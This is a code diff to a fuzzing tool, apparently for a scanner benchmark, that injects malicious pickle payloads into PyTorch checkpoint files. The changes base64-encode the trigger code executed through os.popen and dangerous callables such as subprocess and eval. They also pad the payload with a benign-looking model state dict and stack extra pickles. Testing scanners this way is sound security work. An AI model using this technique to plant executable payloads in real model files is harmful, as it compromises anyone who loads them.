@@ -10,6 +10,7 @@ import os
 import pickle
 import random
 import struct
+import base64
 from typing import Any
 
 from pipeline.opcodes import parse_pickle, OPCODES_BY_BYTE, OPCODES_BY_NAME, OpcodeCategory, OpcodeClassification
@@ -116,7 +117,10 @@ class CandidateGenerator:
 
         # 2. Curate and select a dangerous callable
         if dangerous_callable is None:
-            entries = get_all_entries()
+            entries = [
+                e for e in get_all_entries()
+                if not (e.module == "runpy" and e.name == "run_module")
+            ]
             if not entries:
                 raise ValueError("Dangerous callable registry is empty")
             entry = random.choice(entries)
@@ -131,8 +135,15 @@ class CandidateGenerator:
         injection_parts.append(OPCODES_BY_NAME["GLOBAL"].code)
         injection_parts.append(f"{module}\n{name}\n".encode("latin1"))
         
-        # Generate fuzzed arguments tuple matching the callable
-        expr_payload = f"__import__('os').popen('python3 -c {payload_code!r}').read()"
+        # Generate fuzzed arguments tuple matching the callable.
+        # expr_payload is evaluated as a *Python expression* (builtins.eval,
+        # pandas.eval, sympy.sympify), so the trigger code is base64-encoded to
+        # avoid quote-collision SyntaxErrors: payload_code always contains
+        # single quotes (e.g. open('/tmp/...','w')), which would otherwise
+        # terminate the enclosing string literal.
+        _encoded_payload = base64.b64encode(payload_code.encode("utf-8")).decode("ascii")
+        _shell_cmd = f'python3 -c "import base64;exec(base64.b64decode({_encoded_payload!r}))"'
+        expr_payload = f"__import__('os').popen({_shell_cmd!r}).read()"
         if module == "subprocess" and name in ("Popen", "run", "call", "check_call", "check_output"):
             args = (("python3", "-c", payload_code),)
         elif module == "subprocess" and name in ("getstatusoutput", "getoutput"):
@@ -192,20 +203,87 @@ class CandidateGenerator:
         dangerous_callable: tuple[str, str] | None = None,
         mutate_meta: bool = True,
         mutation_prob: float = 0.15,
+        op_swap_prob: float = 0.0,
+        callable_sub_prob: float = 0.0,
+        arg_fuzz_prob: float = 0.0,
+        stack_prob: float = 0.0,
     ) -> bytes:
-        """Inject a mutated pickle payload into a PyTorch checkpoint file."""
+        """Inject a mutated pickle payload into a PyTorch checkpoint file.
+
+        All feedback-controlled mutation parameters alter the embedded pickle:
+
+        * ``op_swap_prob`` / ``arg_fuzz_prob`` are applied to a benign base
+          state-dict via :class:`pipeline.mutators.PickleMutator` before payload
+          injection, so they produce real byte variation while mostly
+          preserving structural validity (unlike the old code, which mutated an
+          empty ``{}`` whose opcodes could never change).
+        * ``callable_sub_prob`` re-rolls the injected dangerous callable.
+        * ``stack_prob`` appends an independent trailing pickle after the
+          payload's STOP (torch.load reads the first object and ignores it).
+
+        Raises ``ValueError`` when the callable cannot carry an inline payload
+        (e.g. ``runpy.run_module``) or when mutation produces an unparseable
+        stream; callers resample.
+        """
         import tempfile
 
-        # First, generate a malicious pickle payload using a dummy pickle
-        dummy_benign = pickle.dumps({})
+        from pipeline.mutators import PickleMutator
+
+        # A benign model-like base so the mutation operators have real
+        # structure to operate on while staying torch-loadable as a dict.
+        base_benign = {
+            "model": {
+                "transformer.wte.weight": [1.0, 2.0],
+                "transformer.wpe.weight": [3.0, 4.0],
+            },
+            "model_config": {"vocab_size": 50257, "n_embd": 768, "n_layer": 12},
+            "optimizer": {"lr": 1e-5, "beta": 0.9},
+            "training_config": {"fp16": False, "use_cache": True, "gradient_checkpointing": None},
+            "epoch": 1,
+            "random_seed": 42,
+            "note": "regenbench benign seed",
+        }
+        base_pkl = pickle.dumps(base_benign, protocol=5)
+
+        # Phase-3 mutation operators (coverage/feedback-controlled).
+        mutator = PickleMutator()
+        base_pkl = mutator.mutate(
+            base_pkl,
+            op_swap_prob=op_swap_prob,
+            callable_sub_prob=0.0,  # handled below, on the injected callable
+            arg_fuzz_prob=arg_fuzz_prob,
+            stack_prob=0.0,  # stacking is appended after injection instead
+        )
+
+        # Callable substitution: re-roll the injected dangerous callable.
+        # runpy.run_module is excluded: it cannot carry an inline payload, so
+        # choosing it would raise ValueError from mutate_pickle_bytes.
+        if callable_sub_prob and dangerous_callable is not None and random.random() < callable_sub_prob:
+            entries = get_all_entries()
+            alternatives = [
+                e for e in entries
+                if (e.module, e.name) != dangerous_callable
+                and not (e.module == "runpy" and e.name == "run_module")
+            ]
+            if alternatives:
+                entry = random.choice(alternatives)
+                dangerous_callable = (entry.module, entry.name)
+
+        # Metadata mutation + payload injection into the mutated base.
         malicious_pkl = self.mutate_pickle_bytes(
-            pkl_bytes=dummy_benign,
+            pkl_bytes=base_pkl,
             payload_code=payload_code,
             dangerous_callable=dangerous_callable,
             mutate_meta=mutate_meta,
             mutation_prob=mutation_prob,
         )
-        
+
+        # Structural stacking: an independent trailing pickle after the payload's
+        # STOP. torch.load returns the first object and ignores the trailer, so
+        # validity and payload execution are preserved.
+        if stack_prob and random.random() < stack_prob:
+            malicious_pkl += pickle.dumps({"fuzzed_stack_payload": True}, protocol=5)
+
         # Write input bytes to temporary file
         with tempfile.NamedTemporaryFile(suffix=".pt", delete=False) as f_in:
             f_in.write(benign_pt_bytes)
